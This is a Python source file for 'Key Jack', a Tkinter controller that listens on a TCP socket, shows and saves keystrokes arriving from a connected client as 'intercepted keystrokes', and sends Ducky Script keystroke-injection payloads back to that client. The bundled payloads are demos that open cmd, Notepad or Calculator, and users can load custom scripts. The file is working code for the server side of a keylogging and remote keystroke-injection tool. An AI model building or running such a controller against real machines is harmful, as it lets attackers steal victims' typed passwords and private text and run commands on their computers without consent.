import socket
import threading
import tkinter as tk
from tkinter import filedialog, font, messagebox, ttk
import os


class KeyJackServer:
    def __init__(self):
        self.file_repository = {
            "HelloWorld.txt": {
                "content": """
STRING Hello, World!
ENTER
DELAY 1000
STRING This is a Ducky Script test.
ENTER
""",
                "description": "Ducky Script that prints 'Hello, World!' and a test message"
            },
            "OpenCmd.txt": {
                "content": """
REM This is a basic Ducky Script example
DELAY 1000
GUI r
DELAY 200
STRING cmd
DELAY 200
ENTER
DELAY 500
STRING echo Hello from Ducky Script!
ENTER
DELAY 200
STRING ipconfig
ENTER
DELAY 1000
STRING exit
ENTER
""",
                "description": "Ducky Script that opens cmd, prints a message, runs ipconfig, and exits"
            },
            "OpenNotepad.txt": {
                "content": """
DELAY 500
GUI r
DELAY 500
STRING notepad.exe
ENTER
""",
                "description": "Ducky Script that opens Notepad"
            },
            "OpenCalculator.txt": {
                "content": """
DELAY 500
GUI r
DELAY 500
STRING calc.exe
ENTER
""",
                "description": "Ducky Script that opens Calculator"
            }
        }
        self.connected_client = None
        self.server_socket = None
        self.setup_gui()
        self.setup_network()
        self.root.mainloop()

    def setup_gui(self):
        self.root = tk.Tk()
        self.root.title("Key Jack")
        self.root.geometry("800x600")
        self.root.configure(bg='#001933')  # Dark blue background

        self.cyber_font = font.Font(family="Courier", size=12, weight="bold")

        self.create_widgets()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def create_widgets(self):
        # Title
        title_label = tk.Label(self.root, text="< KEY JACK >", font=("Courier", 24, "bold"),
                               bg='#001933', fg='#00FF00')
        title_label.pack(pady=20)

        # File repository
        self.create_file_repository_widgets()

        # Text areas
        text_frame = tk.Frame(self.root, bg='#001933')
        text_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

        self.create_text_area(text_frame, "INTERCEPTED KEYSTROKES", 0)
        self.create_text_area(text_frame, "COMMAND CENTER", 1)

        # Save keystrokes button
        self.save_button = tk.Button(self.root, text="SAVE KEYSTROKES", command=self.save_keystrokes,
                                     bg='#00FF00', fg='#000000', font=self.cyber_font)
        self.save_button.pack(pady=10)

        # Execute button
        self.execute_button = tk.Button(self.root, text="EXECUTE COMMAND", command=self.handle_sending,
                                        bg='#00FF00', fg='#000000', font=self.cyber_font)
        self.execute_button.pack(pady=10)

        # Add custom file button
        self.add_file_button = tk.Button(self.root, text="ADD CUSTOM FILE", command=self.add_custom_file,
                                         bg='#00FF00', fg='#000000', font=self.cyber_font)
        self.add_file_button.pack(pady=10)

        # Status
        self.status_label = tk.Label(self.root, text="STATUS: DISCONNECTED", bg='#001933', fg='#FF0000',
                                     font=self.cyber_font)
        self.status_label.pack(pady=5)

        # System ready label
        self.system_label = tk.Label(self.root, text="[ SYSTEM READY ]", bg='#001933', fg='#00FF00',
                                     font=self.cyber_font)
        self.system_label.pack(pady=5)

    def create_file_repository_widgets(self):
        # Frame for file repository
        repo_frame = tk.Frame(self.root, bg='#001933')
        repo_frame.pack(pady=10, padx=20, fill=tk.X)

        # Combobox for file selection
        self.file_combobox = ttk.Combobox(repo_frame, font=self.cyber_font, state="readonly")
        self.file_combobox['values'] = list(self.file_repository.keys())
        self.file_combobox.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.file_combobox.bind("<<ComboboxSelected>>", self.update_file_description)

        if self.file_repository:
            self.file_combobox.set(list(self.file_repository.keys())[0])

        # File description
        self.file_description = tk.Label(self.root, text="", bg='#001933', fg='#00FF00', font=self.cyber_font,
                                         wraplength=780)
        self.file_description.pack(pady=5)

        # Initialize description
        self.update_file_description(None)

    def create_text_area(self, parent, title, column):
        frame = tk.Frame(parent, bg='#001933')
        frame.grid(row=0, column=column, sticky="nsew", padx=10)
        parent.grid_columnconfigure(column, weight=1)

        label = tk.Label(frame, text=title, bg='#001933', fg='#00FF00', font=self.cyber_font)
        label.pack()

        text_area = tk.Text(frame, height=15, width=40, bg='#000000', fg='#00FF00', font=self.cyber_font)
        text_area.pack(fill=tk.BOTH, expand=True)

        setattr(self, f"{title.lower().replace(' ', '_')}_area", text_area)

    def update_file_description(self, event):
        selected_file = self.file_combobox.get()
        if selected_file in self.file_repository:
            description = self.file_repository[selected_file]["description"]
            self.file_description.config(text=f"File Description: {description}")

    def handle_sending(self):
        selected_file = self.file_combobox.get()
        if selected_file in self.file_repository:
            content = self.file_repository[selected_file]["content"]
            if content:
                self.send_message_to_client(selected_file, content)
            else:
                self.update_command_center("Error: File content is empty.")
        else:
            self.update_command_center("No file selected from repository.")

    def add_custom_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'r') as file:
                content = file.read()
            file_name = os.path.basename(file_path)
            self.file_repository[file_name] = {
                "content": content,
                "description": f"Custom Ducky Script from {file_name}"
            }
            self.file_combobox['values'] = list(self.file_repository.keys())
            self.file_combobox.set(file_name)
            self.update_file_description(None)
            messagebox.showinfo("Add Custom File", f"{file_name} added to repository.")
        else:
            messagebox.showinfo("Add Custom File", "No file selected.")

    def setup_network(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind(('172.20.10.5', 10319))
        self.server_socket.listen(1)

        threading.Thread(target=self.accept_connections, daemon=True).start()

    def accept_connections(self):
        while True:
            client_socket, addr = self.server_socket.accept()
            self.connected_client = client_socket
            self.update_status("CONNECTED")
            threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True).start()

    def handle_client(self, client_socket):
        while True:
            try:
                data = client_socket.recv(1024).decode('utf-8')
                if not data:
                    break
                self.update_intercepted_keystrokes(data)
            except:
                break
        self.connected_client = None
        self.update_status("DISCONNECTED")

    def send_message_to_client(self, file, message):
        if self.connected_client:
            try:
                self.connected_client.send(message.encode('utf-8'))
                self.update_command_center(f"Sent: {file}")
            except:
                self.update_command_center("Failed to send message.")
        else:
            self.update_command_center("No client connected.")

    def update_intercepted_keystrokes(self, message):
        self.intercepted_keystrokes_area.insert(tk.END, message)
        self.intercepted_keystrokes_area.see(tk.END)

    def update_command_center(self, message):
        self.command_center_area.insert(tk.END, message + "\n")
        self.command_center_area.see(tk.END)

    def update_status(self, status):
        self.status_label.config(text=f"STATUS: {status}", fg='#00FF00' if status == 'CONNECTED' else '#FF0000')

    def save_keystrokes(self):
        if not self.intercepted_keystrokes_area.get("1.0", tk.END).strip():
            messagebox.showinfo("Save Keystrokes", "No keystrokes to save.")
            return

        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'w') as f:
                f.write(self.intercepted_keystrokes_area.get("1.0", tk.END))
            messagebox.showinfo("Save Keystrokes", f"Keystrokes saved to {file_path}")
            self.intercepted_keystrokes_area.delete("1.0", tk.END)
        else:
            messagebox.showinfo("Save Keystrokes", "Save operation cancelled.")

    def on_closing(self):
        if self.server_socket:
            self.server_socket.close()
        self.root.destroy()


if __name__ == "__main__":
    KeyJackServer()
